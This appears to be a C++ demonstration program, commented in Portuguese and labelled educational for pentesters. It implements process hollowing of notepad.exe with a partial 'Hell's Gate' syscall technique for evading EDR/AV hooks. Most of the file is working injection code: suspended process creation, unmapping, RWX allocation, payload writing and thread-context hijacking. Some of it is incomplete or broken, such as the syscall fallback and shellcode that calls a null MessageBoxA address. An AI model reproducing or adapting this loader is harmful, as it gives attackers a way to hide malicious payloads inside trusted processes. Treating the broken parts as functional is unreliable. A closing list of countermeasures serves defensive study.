#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>

/*
 * DEMONSTRAÇÃO EDUCACIONAL: Process Hollowing com Hell's Gate
 * 
 * Este código demonstra a técnica de Process Hollowing combinada com Hell's Gate
 * para fins educacionais em pentesting e análise de malware.
 * 
 * AVISO: Este código é apenas para demonstração educacional em ambiente controlado!
 * 
 * Técnicas demonstradas:
 * 1. Hell's Gate: Resolução dinâmica de syscalls para evasão de hooks
 * 2. Process Hollowing: Substituição de código em processo legítimo
 * 3. Manual DLL loading e API resolution
 */

// Estruturas necessárias para Hell's Gate
typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD Address;
    PVOID SyscallAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Protótipos das funções NTAPI
typedef NTSTATUS(NTAPI* pNtCreateProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    BOOLEAN InheritObjectTable,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

// Variáveis globais para syscalls
pNtCreateProcess g_NtCreateProcess = nullptr;
pNtWriteVirtualMemory g_NtWriteVirtualMemory = nullptr;
pNtResumeThread g_NtResumeThread = nullptr;

/*
 * FUNÇÃO: CalculateHash
 * PROPÓSITO: Calcula hash djb2 de uma string (usado no Hell's Gate)
 * PARÂMETROS: 
 *   - data: ponteiro para string
 * RETORNO: Hash da string
 */
DWORD CalculateHash(PCSTR data) {
    DWORD hash = 5381;
    while (*data) {
        hash = ((hash << 5) + hash) + *data++;
    }
    return hash;
}

/*
 * FUNÇÃO: FindSyscallNumber
 * PROPÓSITO: Encontra o número do syscall no NTDLL usando Hell's Gate
 * PARÂMETROS:
 *   - functionName: nome da função NTAPI
 * RETORNO: Número do syscall ou -1 se não encontrado
 * 
 * EXPLICAÇÃO HELL'S GATE:
 * Esta técnica busca diretamente pelos opcodes dos syscalls no NTDLL
 * para evitar hooks de EDRs/AVs que normalmente interceptam chamadas de API
 */
DWORD FindSyscallNumber(PCSTR functionName) {
    printf("[DEBUG] Buscando syscall para: %s\n", functionName);
    
    // Obter handle do NTDLL
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[ERRO] Não foi possível obter handle do NTDLL\n");
        return -1;
    }
    
    // Obter endereço da função
    FARPROC functionAddress = GetProcAddress(hNtdll, functionName);
    if (!functionAddress) {
        printf("[ERRO] Não foi possível encontrar %s\n", functionName);
        return -1;
    }
    
    printf("[DEBUG] Endereço de %s: 0x%p\n", functionName, functionAddress);
    
    // Verificar se a função não está hooked
    // Syscalls normais começam com: MOV R10, RCX; MOV EAX, syscall_number
    BYTE* bytes = (BYTE*)functionAddress;
    
    // Padrão esperado: 4C 8B D1 B8 [syscall_number]
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8) {
        DWORD syscallNumber = *(DWORD*)(bytes + 4);
        printf("[SUCESSO] Syscall %s encontrado: 0x%x\n", functionName, syscallNumber);
        return syscallNumber;
    }
    
    printf("[AVISO] Função %s pode estar hooked, buscando syscall próximo...\n", functionName);
    
    // Se hooked, tentar encontrar syscall não hooked próximo
    // (implementação simplificada para demo)
    return -1;
}

/*
 * FUNÇÃO: InitializeHellsGate
 * PROPÓSITO: Inicializa os syscalls necessários usando Hell's Gate
 * RETORNO: TRUE se bem-sucedido, FALSE caso contrário
 */
BOOL InitializeHellsGate() {
    printf("[INFO] Inicializando Hell's Gate...\n");
    
    // Para esta demo, vamos usar as APIs normais mas mostrar o conceito
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[ERRO] Falha ao carregar NTDLL\n");
        return FALSE;
    }
    
    // Em um cenário real, usaríamos syscalls diretos
    g_NtCreateProcess = (pNtCreateProcess)GetProcAddress(hNtdll, "NtCreateProcess");
    g_NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    g_NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
    
    if (!g_NtCreateProcess || !g_NtWriteVirtualMemory || !g_NtResumeThread) {
        printf("[ERRO] Falha ao resolver APIs do NTDLL\n");
        return FALSE;
    }
    
    printf("[SUCESSO] Hell's Gate inicializado com sucesso\n");
    return TRUE;
}

/*
 * FUNÇÃO: CreateHollowedProcess
 * PROPÓSITO: Implementa a técnica de Process Hollowing
 * PARÂMETROS:
 *   - targetPath: caminho do processo legítimo a ser "hollowed"
 *   - payloadBuffer: buffer contendo o payload malicioso
 *   - payloadSize: tamanho do payload
 * RETORNO: TRUE se bem-sucedido, FALSE caso contrário
 * 
 * EXPLICAÇÃO PROCESS HOLLOWING:
 * 1. Criar processo em estado suspenso
 * 2. "Esvaziar" a memória do processo (unmap)
 * 3. Alocar nova memória e escrever nosso payload
 * 4. Ajustar o contexto do thread principal
 * 5. Resumir execução
 */
BOOL CreateHollowedProcess(LPCWSTR targetPath, LPVOID payloadBuffer, SIZE_T payloadSize) {
    printf("[INFO] Iniciando Process Hollowing...\n");
    printf("[INFO] Target: %ws\n", targetPath);
    printf("[INFO] Payload size: %zu bytes\n", payloadSize);
    
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    
    // PASSO 1: Criar processo em estado suspenso
    printf("[PASSO 1] Criando processo suspenso...\n");
    if (!CreateProcessW(
        targetPath,                    // Nome do aplicativo
        NULL,                         // Linha de comando
        NULL,                         // Atributos de segurança do processo
        NULL,                         // Atributos de segurança do thread
        FALSE,                        // Não herdar handles
        CREATE_SUSPENDED,             // Flags de criação (SUSPENSO!)
        NULL,                         // Ambiente
        NULL,                         // Diretório atual
        &si,                          // STARTUPINFO
        &pi                           // PROCESS_INFORMATION
    )) {
        printf("[ERRO] Falha ao criar processo: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[SUCESSO] Processo criado - PID: %d, TID: %d\n", pi.dwProcessId, pi.dwThreadId);
    
    // PASSO 2: Obter contexto do thread principal
    printf("[PASSO 2] Obtendo contexto do thread...\n");
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERRO] Falha ao obter contexto: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[DEBUG] Entry Point original: 0x%p\n", (PVOID)ctx.Rcx);
    
    // PASSO 3: Ler cabeçalho PE do processo target
    printf("[PASSO 3] Lendo cabeçalho PE do target...\n");
    IMAGE_DOS_HEADER dosHeader;
    SIZE_T bytesRead;
    
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rdx, &dosHeader, sizeof(dosHeader), &bytesRead)) {
        printf("[ERRO] Falha ao ler DOS header: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    IMAGE_NT_HEADERS ntHeaders;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + dosHeader.e_lfanew), &ntHeaders, sizeof(ntHeaders), &bytesRead)) {
        printf("[ERRO] Falha ao ler NT headers: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[DEBUG] Image base: 0x%p\n", (PVOID)ntHeaders.OptionalHeader.ImageBase);
    printf("[DEBUG] Entry point: 0x%p\n", (PVOID)ntHeaders.OptionalHeader.AddressOfEntryPoint);
    
    // PASSO 4: "Esvaziar" o processo (unmap da imagem original)
    printf("[PASSO 4] Esvaziando processo original...\n");
    
    // Usar NtUnmapViewOfSection (via Hell's Gate em implementação real)
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)ntHeaders.OptionalHeader.ImageBase);
        if (status == 0) {
            printf("[SUCESSO] Imagem original desmapeada\n");
        } else {
            printf("[AVISO] Falha ao desmapear (status: 0x%x), continuando...\n", status);
        }
    }
    
    // PASSO 5: Alocar memória para nosso payload
    printf("[PASSO 5] Alocando memória para payload...\n");
    LPVOID allocatedMemory = VirtualAllocEx(
        pi.hProcess,                          // Handle do processo
        (LPVOID)ntHeaders.OptionalHeader.ImageBase,  // Endereço preferido
        payloadSize,                          // Tamanho
        MEM_COMMIT | MEM_RESERVE,             // Tipo de alocação
        PAGE_EXECUTE_READWRITE                // Proteção
    );
    
    if (!allocatedMemory) {
        printf("[ERRO] Falha ao alocar memória: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[SUCESSO] Memória alocada em: 0x%p\n", allocatedMemory);
    
    // PASSO 6: Escrever nosso payload na memória alocada
    printf("[PASSO 6] Escrevendo payload...\n");
    SIZE_T bytesWritten;
    
    if (!WriteProcessMemory(pi.hProcess, allocatedMemory, payloadBuffer, payloadSize, &bytesWritten)) {
        printf("[ERRO] Falha ao escrever payload: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocatedMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[SUCESSO] %zu bytes escritos\n", bytesWritten);
    
    // PASSO 7: Ajustar contexto para apontar para nosso payload
    printf("[PASSO 7] Ajustando contexto do thread...\n");
    
    // Definir novo entry point (simplificado para demo)
    ctx.Rcx = (DWORD64)allocatedMemory;  // Novo entry point
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERRO] Falha ao definir contexto: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocatedMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[SUCESSO] Contexto ajustado\n");
    
    // PASSO 8: Resumir execução do processo
    printf("[PASSO 8] Resumindo execução...\n");
    
    if (ResumeThread(pi.hThread) == -1) {
        printf("[ERRO] Falha ao resumir thread: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocatedMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    printf("[SUCESSO] Process Hollowing concluído!\n");
    printf("[INFO] Processo %d agora está executando nosso payload\n", pi.dwProcessId);
    
    // Cleanup handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

/*
 * FUNÇÃO: GenerateDemoPayload
 * PROPÓSITO: Gera um payload simples para demonstração (MessageBox)
 * PARÂMETROS:
 *   - buffer: buffer para armazenar o payload
 *   - size: tamanho do buffer gerado
 * RETORNO: TRUE se bem-sucedido
 */
BOOL GenerateDemoPayload(LPVOID* buffer, SIZE_T* size) {
    printf("[INFO] Gerando payload de demonstração...\n");
    
    // Shellcode simples que exibe MessageBox (x64)
    // Este é um exemplo educacional - em cenário real seria mais complexo
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
        0x48, 0x31, 0xC9,                               // xor rcx, rcx
        0x48, 0x31, 0xD2,                               // xor rdx, rdx  
        0x4D, 0x31, 0xC0,                               // xor r8, r8
        0x4D, 0x31, 0xC9,                               // xor r9, r9
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA
        0xFF, 0xD0,                                     // call rax
        0x48, 0x83, 0xC4, 0x28,                         // add rsp, 40
        0xC3                                            // ret
    };
    
    *size = sizeof(shellcode);
    *buffer = malloc(*size);
    
    if (!*buffer) {
        printf("[ERRO] Falha ao alocar buffer para payload\n");
        return FALSE;
    }
    
    memcpy(*buffer, shellcode, *size);
    printf("[SUCESSO] Payload gerado (%zu bytes)\n", *size);
    
    return TRUE;
}

/*
 * FUNÇÃO: main
 * PROPÓSITO: Função principal da demonstração
 */
int main() {
    printf("=== DEMONSTRAÇÃO: Process Hollowing com Hell's Gate ===\n");
    printf("=== PROPÓSITO: Educacional para pentesters           ===\n");
    printf("=== AMBIENTE: Controlado e autorizado                ===\n\n");
    
    // ETAPA 1: Inicializar Hell's Gate
    printf("[ETAPA 1] Inicializando Hell's Gate...\n");
    if (!InitializeHellsGate()) {
        printf("[FALHA] Não foi possível inicializar Hell's Gate\n");
        return -1;
    }
    
    // ETAPA 2: Gerar payload de demonstração
    printf("\n[ETAPA 2] Gerando payload de demonstração...\n");
    LPVOID payloadBuffer;
    SIZE_T payloadSize;
    
    if (!GenerateDemoPayload(&payloadBuffer, &payloadSize)) {
        printf("[FALHA] Não foi possível gerar payload\n");
        return -1;
    }
    
    // ETAPA 3: Executar Process Hollowing
    printf("\n[ETAPA 3] Executando Process Hollowing...\n");
    
    // Usar notepad.exe como target (processo legítimo)
    LPCWSTR targetProcess = L"C:\\Windows\\System32\\notepad.exe";
    
    if (!CreateHollowedProcess(targetProcess, payloadBuffer, payloadSize)) {
        printf("[FALHA] Process Hollowing não foi bem-sucedido\n");
        free(payloadBuffer);
        return -1;
    }
    
    printf("\n=== DEMONSTRAÇÃO CONCLUÍDA COM SUCESSO ===\n");
    printf("PONTOS IMPORTANTES PARA OS PENTESTERS:\n");
    printf("1. Hell's Gate evita hooks de EDR/AV\n");
    printf("2. Process Hollowing mascara execução maliciosa\n");
    printf("3. Processo aparenta ser legítimo no Process Explorer\n");
    printf("4. Detecção requer análise comportamental avançada\n\n");
    
    printf("CONTRAMEDIDAS:\n");
    printf("1. Monitoramento de syscalls diretos\n");
    printf("2. Análise de integridade de processos\n");
    printf("3. Detecção de padrões de unmapping\n");
    printf("4. Análise heurística de comportamento\n\n");
    
    free(payloadBuffer);
    
    printf("Pressione Enter para finalizar...");
    getchar();
    
    return 0;
}